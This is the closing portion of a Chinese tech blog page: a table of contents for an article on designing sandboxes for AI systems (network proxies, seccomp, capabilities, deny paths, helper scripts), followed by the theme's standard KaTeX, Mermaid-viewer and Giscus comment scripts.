class="toc-text">超越文件系统：网络控制与纵深防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%EF%BC%9A%E4%B8%89%E5%B1%82%E4%BB%A3%E7%90%86%E6%9E%B6%E6%9E%84"><span class="toc-number">4.1.</span> <span class="toc-text">网络：三层代理架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seccomp%EF%BC%9A%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%BF%87%E6%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">Seccomp：系统调用过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Capability-%E4%B8%8E-no-new-privs"><span class="toc-number">4.3.</span> <span class="toc-text">Capability 与 no_new_privs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA"><span class="toc-number">4.4.</span> <span class="toc-text">符号链接行为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E6%8B%92%E7%BB%9D%E8%B7%AF%E5%BE%84"><span class="toc-number">4.5.</span> <span class="toc-text">强制拒绝路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E5%B9%B3%E5%8F%B0%E9%80%82%E9%85%8D"><span class="toc-number">4.6.</span> <span class="toc-text">按平台适配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%A7%E8%83%BD%E4%B8%8E%E9%9A%94%E7%A6%BB%E7%9A%84%E6%9D%83%E8%A1%A1"><span class="toc-number">4.7.</span> <span class="toc-text">性能与隔离的权衡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%85%A8%E6%99%AF"><span class="toc-number">4.8.</span> <span class="toc-text">防御全景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">会话生命周期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">附录：可直接使用的沙盒脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E4%BE%9D%E8%B5%96"><span class="toc-number">6.1.</span> <span class="toc-text">前置依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox-setup-%E2%80%94-%E5%87%86%E5%A4%87%E6%B2%99%E7%9B%92%E7%8E%AF%E5%A2%83"><span class="toc-number">6.2.</span> <span class="toc-text">sandbox-setup — 准备沙盒环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox-exec-%E2%80%94-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.3.</span> <span class="toc-text">sandbox-exec — 执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox-teardown-%E2%80%94-%E5%88%A0%E9%99%A4%E6%B2%99%E7%9B%92"><span class="toc-number">6.4.</span> <span class="toc-text">sandbox-teardown — 删除沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">6.5.</span> <span class="toc-text">使用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/%E4%B8%80%E6%AC%A1Claude-Code%E7%BC%93%E5%AD%98%E5%B4%A9%E6%BA%83%E7%9A%84%E5%AE%8C%E6%95%B4%E6%BA%AF%E6%BA%90.html" title="一次 Claude Code 缓存崩溃的完整溯源——从 99% 暴跌到 0.4% 的数据→源码→验证之旅">一次 Claude Code 缓存崩溃的完整溯源——从 99% 暴跌到 0.4% 的数据→源码→验证之旅</a><time datetime="2026-06-15T10:00:00.000Z" title="发表于 2026-06-15 18:00:00">2026-06-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/AI%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF.html" title="AI 系统的沙盒执行环境设计思路">AI 系统的沙盒执行环境设计思路</a><time datetime="2026-05-23T04:00:00.000Z" title="发表于 2026-05-23 12:00:00">2026-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/Chrome%E7%BF%BB%E8%AF%91%E5%BC%BA%E5%88%B6%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88.html" title="Chrome 翻译强制代理方案">Chrome 翻译强制代理方案</a><time datetime="2026-05-22T16:19:31.000Z" title="发表于 2026-05-23 00:19:31">2026-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/%E9%80%9A%E8%BF%87%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8E%A5ConvertX.html" title="通过代码对接ConvertX">通过代码对接ConvertX</a><time datetime="2026-02-08T12:39:06.000Z" title="发表于 2026-02-08 20:39:06">2026-02-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/%E4%BD%99%E5%BC%A6%E7%9B%B8%E4%BC%BC%E5%BA%A6%E7%9A%84%E6%8E%A8%E5%AF%BC%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BD%B1%E5%93%8D%E7%9B%B8%E4%BC%BC%E5%BA%A6%E8%AE%A1%E7%AE%97%E7%9A%84%E5%90%91%E9%87%8F%E7%BB%B4%E5%BA%A6%E6%8B%93%E5%B1%95%E6%96%B9%E6%B3%95.html" title="余弦相似度的推导以及不影响相似度计算的向量维度拓展方法">余弦相似度的推导以及不影响相似度计算的向量维度拓展方法</a><time datetime="2026-01-22T08:43:27.000Z" title="发表于 2026-01-22 16:43:27">2026-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By codexvn</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex@0.16.28/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex@0.16.28/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'neutral'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (false) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (false) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"data-mapping":"title","data-strict":0,"data-reactions-enabled":1,"data-emit-metadata":0,"data-input-position":"top","data-lang":"zh-CN","crossorigin":"anonymous"}
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'codexvn/codexvn.github.io',
+      'data-repo-id': 'MDEwOlJlcG9zaXRvcnkzNTA5ODQ0Njg=',
+      'data-category-id': 'DIC_kwDOFOuZFM4Ccavs',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !true) {
+    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
